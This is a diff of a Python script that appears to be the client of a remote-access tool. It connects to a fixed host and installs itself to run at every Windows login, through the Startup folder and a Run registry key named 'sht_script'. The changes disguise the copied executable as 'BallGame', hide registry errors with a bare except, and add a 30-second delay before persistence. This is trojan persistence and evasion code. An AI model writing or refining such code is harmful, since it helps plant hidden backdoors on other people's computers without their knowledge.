@@ -7,6 +7,9 @@ import winreg
 import time
 
 
+ArchiveName = "BallGame"
+
+
 def connect():  # Connects to the client
     socket = sk.socket()
     host = "DESKTOP-0SMA87V"
@@ -23,7 +26,7 @@ def AddStartUp(ext: str = ".pyw"):  # Archive extension ex: .exe, .py, .pyw, .ba
     # Sets the path to the startUp
     path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'
 
-    checkpath = pathlib.Path(path + "\\Execute" + ext)
+    checkpath = pathlib.Path(path + f"\\{ArchiveName}" + ext)
     print(checkpath)
     print(type(checkpath))
 
@@ -31,25 +34,29 @@ def AddStartUp(ext: str = ".pyw"):  # Archive extension ex: .exe, .py, .pyw, .ba
         return
     else:
         # Copy the archive to the windows startup
-        os.system("copy {} {}".format("Execute" + ext, path))
+        os.system("copy {} {}".format(ArchiveName + ext, path))
 
 
 def AddToRegister():
-    save = open("save.txt", "w+")  # Opens .txt archive
-    if save.read() == "":
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                             "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)  # Sets the acces to the reg
-        # info again..
-        username = getuser()
-        # Path of the archive
-        path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\Execute.exe'
-        winreg.SetValueEx(key, "sht_script", 0, winreg.REG_SZ,
-                          path)  # Sets the path to the value
-        # Write on the archive that is saved so we dont need to run this again
-        save.write("saved")
-        save.close()  # Closes the archive
+    try:  # Error handling
+        save = open("save.txt", "w+")  # Opens .txt archive
+        if save.read() == "":
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)  # Sets the acces to the reg
+            # info again..
+            username = getuser()
+            # Path of the archive
+            path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\Execute.exe'
+            winreg.SetValueEx(key, "sht_script", 0, winreg.REG_SZ,
+                              path)  # Sets the path to the value
+            # Write on the archive that is saved so we dont need to run this again
+            save.write("saved")
+            save.close()  # Closes the archive
+    except:
+        Exception
 
 
+time.sleep(30)
 AddStartUp(".exe")  # This adds the .exe (app) to the startup
 time.sleep(1)  # Waits 1 sec
 AddToRegister()  # Adds the reg thing
